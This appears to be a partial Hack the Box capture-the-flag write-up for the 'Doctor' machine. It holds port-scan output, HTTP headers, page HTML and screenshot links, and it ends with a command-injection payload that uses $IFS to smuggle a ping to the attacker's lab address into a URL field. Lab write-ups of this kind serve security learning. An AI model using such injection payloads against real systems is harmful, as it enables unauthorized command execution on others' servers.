# Hack the Box - Doctor

```shell
root@kali# rustscan -b 1000 -u 5000 -r 0-65535 -a 10.10.10.209 -- -Pn
```
```shell
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.209:22
Open 10.10.10.209:80
Open 10.10.10.209:8089
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -Pn" on ip 10.10.10.209
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-27 13:24 IST
Initiating Parallel DNS resolution of 1 host. at 13:24
Completed Parallel DNS resolution of 1 host. at 13:24, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:24
Scanning 10.10.10.209 [3 ports]
Discovered open port 80/tcp on 10.10.10.209
Discovered open port 22/tcp on 10.10.10.209
Discovered open port 8089/tcp on 10.10.10.209
Completed Connect Scan at 13:24, 0.15s elapsed (3 total ports)
Nmap scan report for 10.10.10.209
Host is up, received user-set (0.15s latency).
Scanned at 2023-09-27 13:24:41 IST for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
8089/tcp open  unknown syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.19 seconds
```

```shell
root@kali# rustscan -u 5000 -p 22,80,8089 -- -sC -sV
```
```shell
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.209:22
Open 10.10.10.209:80
Open 10.10.10.209:8089
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sC -sV" on ip 10.10.10.209
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-27 13:26 IST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:26
Completed NSE at 13:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:26
Completed NSE at 13:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:26
Completed NSE at 13:26, 0.00s elapsed
Initiating Ping Scan at 13:26
Scanning 10.10.10.209 [2 ports]
Completed Ping Scan at 13:26, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:26
Completed Parallel DNS resolution of 1 host. at 13:26, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:26
Scanning 10.10.10.209 [3 ports]
Discovered open port 80/tcp on 10.10.10.209
Discovered open port 22/tcp on 10.10.10.209
Discovered open port 8089/tcp on 10.10.10.209
Completed Connect Scan at 13:26, 0.15s elapsed (3 total ports)
Initiating Service scan at 13:26
Scanning 3 services on 10.10.10.209
Completed Service scan at 13:27, 33.64s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.10.209.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:27
Completed NSE at 13:27, 10.31s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:27
Completed NSE at 13:27, 1.24s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:27
Completed NSE at 13:27, 0.00s elapsed
Nmap scan report for 10.10.10.209
Host is up, received syn-ack (0.15s latency).
Scanned at 2023-09-27 13:26:59 IST for 46s

PORT     STATE SERVICE  REASON  VERSION
22/tcp   open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzyPiL1j9E6lyOgxqgosQ64mBwocTGo1DpclHHV5w28qPbnBJL32hfDNgUhAeaq7PL8zOQlKWprEnkfBNTUagvcX7deMgPsJ6zow/K+WPqIUU5+LbQQ9TV6YeiWiPrO1W9dwwY0ZTXkkG6905kLDsKtCQZqt0VUGPiyWnZswXwWjbBo9KBF1dctUKv+MuyPLQ2qAr5X9LL21/tWw0fLrIKLkCvdaMI9tVYXeFNZ1WyJSI4BfCB5OrNzpr4RN/CaGSjSiBGn2zkegsk+zJpePSp9qfP/fMwEyDQ1c8kei0g35Neaw5Mob1q3R0L6w8fTAnsYo9bYlnHNOl4Juon0QaOfzDry/c4Hmwi43ypeUlv2zUdgGDUdemG79/nHx/rtLbBvdROI3UIjn6HOweHJs9VmwUjx509xZGoCwRcB0lIrDg9pWitWbg+qMTBvvYrLWgSovjpnilu8OcVituQHoXrrLMFVREY0SzF7K6SqbBO7QTrKODzrf1aH5gdgQNCE18=
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOHMC7+4t7zcs7cPg4JoOZiJF+MiORNU6ky66rLocXDEySgRgkeNf2uzjblvpnn2QYid7TCQUwQ/6Bbz2yFM7jg=
|   256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEF0lJKhEknY94/rK0D2et4K9Tp2E6CsYp0GxwdNJGhs
80/tcp   open  http     syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Doctor
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
8089/tcp open  ssl/http syn-ack Splunkd httpd
|_http-server-header: Splunkd
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/emailAddress=support@splunk.com/localityName=San Francisco
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-06T15:57:27
| Not valid after:  2023-09-06T15:57:27
| MD5:   db23:4e5c:546d:8895:0f5f:8f42:5e90:6787
| SHA-1: 7ec9:1bb7:343f:f7f6:bdd7:d015:d720:6f6f:19e2:098b
| -----BEGIN CERTIFICATE-----
| MIIDMjCCAhoCCQC3IKogA4zEAzANBgkqhkiG9w0BAQsFADB/MQswCQYDVQQGEwJV
| UzELMAkGA1UECAwCQ0ExFjAUBgNVBAcMDVNhbiBGcmFuY2lzY28xDzANBgNVBAoM
| BlNwbHVuazEXMBUGA1UEAwwOU3BsdW5rQ29tbW9uQ0ExITAfBgkqhkiG9w0BCQEW
| EnN1cHBvcnRAc3BsdW5rLmNvbTAeFw0yMDA5MDYxNTU3MjdaFw0yMzA5MDYxNTU3
| MjdaMDcxIDAeBgNVBAMMF1NwbHVua1NlcnZlckRlZmF1bHRDZXJ0MRMwEQYDVQQK
| DApTcGx1bmtVc2VyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0JgJ
| NKrC4SrGzEhhyluUIcBW+eD6y+4paEikip5bzO7Xz8+tVJmFBcDfZdkL3TIZFTCF
| 95BMqL4If1SNZlFQxpMZB/9PzCMm0HmhEK/FlHfdrLwaeK71SWeO/MMNtsAheIPA
| pNByri9icp2S9u7wg89g9uHK4ION8uTJMxbmtCRT4jgRcenOZYghvsTEMLPhwlb2
| M/59WRopfyakIEl/w/zF1jCfnrT6XfZtTos6ueet6lhjd8g5WW9ZJIfmjYDaqHPg
| Tg3yLCRjYhLk+2vLyrO23l5kk8H+H4JgIOCqhAw38hC0r+KETsuWCGIxl4rBBDQw
| E5TvP75NsGW2O3JNDQIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQBJjjx+KHFwYJei
| lMJlmXBOEs7V1KiAjCenWd0Bz49Bkbik/5Rcia9k44zhANE7pJWNN6gpGJBn7b7D
| rliSOwvVoBICHtWFuQls8bRbMn5Kfdd9G7tGEkKGdvn3jOFkQFSQQQ56Uzh7Lezj
| hjtQ1p1Sg2Vq3lJm70ziOlRa0i/Lk7Ydc3xJ478cjB9nlb15jXmSdZcrCqgsAjBz
| IIDPzC+f7hJYlnFau2OA5uWPX/HIR7JfQsKXWCM6Tx0b9tZKgNNOr+DwyML4CH6o
| qrryh7elUJojAaZ0wYNd5koGZzEH4ymAQoshgFyEgetm1BbzMbA3PfZkX1VR6AV+
| guO5oa9R
|_-----END CERTIFICATE-----
|_http-title: splunkd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:27
Completed NSE at 13:27, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:27
Completed NSE at 13:27, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:27
Completed NSE at 13:27, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.88 seconds
```

## HTTP 80
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/4fdf842b-3b62-46fd-8ce2-de8b1d5aec36)

```shell
root@kali# sudo bash -c "echo '10.10.10.209    doctors.htb' >> /etc/hosts"
```

## Virtual Host
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/975f588d-00eb-445d-86b5-6d5329c73a4a)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/c4ff87b3-8fb5-4997-b54e-73d290e0cbf5)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/8deeafa5-d798-43d5-8c6f-ad3ec96c16ee)

```http
HTTP/1.1 200 OK
Date: Wed, 27 Sep 2023 09:18:26 GMT
Server: Werkzeug/1.0.1 Python/3.8.2
Content-Type: text/html; charset=utf-8
Vary: Cookie,Accept-Encoding
Set-Cookie: session=eyJfZnJlc2giOmZhbHNlfQ.ZRPzYg.2BsJtAPYE0-phjRisk3VGsN81Nk; HttpOnly; Path=/
Content-Encoding: gzip
Content-Length: 1465
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
```

![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/a48ba5c5-6d81-4919-8430-75657ce607df)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/eaf27a32-62d9-4c97-b7c4-6121f8d2ddc1)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/46c795cb-e179-4891-bb74-3cf58581321f)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/c5dc8408-4fe6-4e48-b070-80e656197ea7)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/33c86aff-e6ae-434d-9b4c-6b208ffab093)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/d63cc17a-0c94-46f1-985e-8a8ecb55b6f7)

```html
<!DOCTYPE html>
<html>
<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">

    <link rel="stylesheet" type="text/css" href="/static/main.css">

    
        <title>Doctor Secure Messaging</title>
    
</head>
<body>
    <header class="site-header">
      <nav class="navbar navbar-expand-md navbar-dark bg-dark fixed-top">
        <div class="container">
          <a class="navbar-brand mr-4" href="/">Doctor Secure Messaging</a>
          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarToggle" aria-controls="navbarToggle" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
          </button>
          <div class="collapse navbar-collapse" id="navbarToggle">
            <div class="navbar-nav mr-auto">
              <a class="nav-item nav-link" href="/home">Home</a>
              <!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
            </div>
            <!-- Navbar Right Side -->
            <div class="navbar-nav">
              
                <a class="nav-item nav-link" href="/post/new">New Message</a>
                <a class="nav-item nav-link" href="/account">Account</a>
                <a class="nav-item nav-link" href="/logout">Logout</a>
              
            </div>
          </div>
        </div>
      </nav>
    </header>
    <main role="main" class="container">
      <div class="row">
        <div class="col-md-12">
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/7d6ee387-ee30-4184-b233-c31b96096184)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/82dca24b-10fb-4e1d-b0f4-0ab29f189cd1)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/5a0724c6-0add-4b02-a4aa-c98f395d52ce)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/a1fec5ed-4eb7-477a-bb39-a87b8f3b253e)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b2a4b8fa-5f7e-454e-82ea-0133dd3ff0ef)

Command Injection
```shell
http://10.10.14.10/$(ping$IFS-c$IFS'1'$IFS'10.10.14.10')
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/59423275-cbfb-4e12-bd39-4d2378df9249)

